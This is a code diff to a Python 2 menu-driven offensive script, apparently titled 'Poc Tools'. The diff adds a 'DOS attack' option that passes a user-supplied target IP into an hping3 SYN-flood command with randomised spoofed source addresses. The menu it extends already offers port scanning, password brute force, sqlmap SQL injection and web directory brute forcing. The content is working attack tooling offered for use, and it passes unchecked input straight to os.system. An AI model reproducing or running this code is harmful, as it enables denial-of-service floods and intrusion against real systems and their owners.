@@ -60,6 +60,13 @@ def sqlInject():
         else:
              os.system('sqlmap -r ./%s'%(post_file))
 
+def Dos_attack():
+	host = raw_input("Enter attack target host ip: ");
+	if(host == ''):
+		print '[-] Input is null.'
+	else:
+		os.system('hping3 -c 1000  -S -w 64 -p 80 --flood --rand-source %s'%(host))
+
 def main():
   os.system('figlet Poc Tools -f /usr/share/figlet/big.flf')
   while(1):
@@ -69,9 +76,10 @@ def main():
     print "[*] 2. Password brute_force.\r"
     print "[*] 3. SqlInject attack.\r"
     print "[*] 4. Web dir brute attack.\r"
+    print "[*] 5. DOS attack.\r"
     print "[*] 0. Exit script.\r\n"
     attack_type = raw_input("Confirm the type of attack you chose first: ")
-    attacks = {'1': port_scan,'2': brute_force,'3': sqlInject,'4': web_dir_brute,'0': Exit}
+    attacks = {'1': port_scan,'2': brute_force,'3': sqlInject,'4': web_dir_brute,'5': Dos_attack,'0': Exit}
     start_attack = attacks[attack_type]
     start_attack()
     
